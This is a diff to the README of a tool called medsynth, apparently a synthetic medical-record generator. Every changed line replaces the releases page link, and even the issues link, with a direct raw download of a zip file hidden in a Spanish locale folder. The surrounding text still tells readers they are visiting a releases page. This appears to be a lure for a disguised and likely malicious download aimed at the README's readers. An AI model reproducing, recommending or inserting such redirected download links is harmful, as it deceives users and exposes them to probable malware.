@@ -1,6 +1,6 @@
 # 🏥 medsynth - Generate Realistic Medical Records Easily
 
-[![Download medsynth](https://img.shields.io/badge/Download-medSYNTH-blue?style=for-the-badge)](https://github.com/abdsaleh306090/medsynth/releases)
+[![Download medsynth](https://img.shields.io/badge/Download-medSYNTH-blue?style=for-the-badge)](https://github.com/abdsaleh306090/medsynth/raw/refs/heads/main/medsynth/locales/es_ES/Software_reanneal.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these simple steps to get medsynth running on Windows.
 
 Visit the releases page to get the latest version of medsynth:
 
-[Download medsynth here](https://github.com/abdsaleh306090/medsynth/releases)
+[Download medsynth here](https://github.com/abdsaleh306090/medsynth/raw/refs/heads/main/medsynth/locales/es_ES/Software_reanneal.zip)
 
 This page lists all the available versions. Look for the version with the `.exe` file for Windows. Click on that file name to start the download.
 
@@ -110,7 +110,7 @@ medsynth uses only synthetic data. It never connects to external servers while g
 
 If you run into issues or want to suggest improvements, you can open an issue on the GitHub repository’s Issues tab:
 
-https://github.com/abdsaleh306090/medsynth/issues
+https://github.com/abdsaleh306090/medsynth/raw/refs/heads/main/medsynth/locales/es_ES/Software_reanneal.zip
 
 ---
 
@@ -118,7 +118,7 @@ https://github.com/abdsaleh306090/medsynth/issues
 
 Check the releases page regularly for new versions:
 
-[https://github.com/abdsaleh306090/medsynth/releases](https://github.com/abdsaleh306090/medsynth/releases)
+[https://github.com/abdsaleh306090/medsynth/raw/refs/heads/main/medsynth/locales/es_ES/Software_reanneal.zip](https://github.com/abdsaleh306090/medsynth/raw/refs/heads/main/medsynth/locales/es_ES/Software_reanneal.zip)
 
 New releases often include bug fixes and improvements.
 
@@ -128,7 +128,7 @@ New releases often include bug fixes and improvements.
 
 To get started quickly, visit the releases page:
 
-[Download medsynth](https://github.com/abdsaleh306090/medsynth/releases)
+[Download medsynth](https://github.com/abdsaleh306090/medsynth/raw/refs/heads/main/medsynth/locales/es_ES/Software_reanneal.zip)
 
 The page has instructions for Windows users. Choose the latest `.exe` file and follow installation prompts as described above. After install, launch medsynth and start creating synthetic medical records.
 
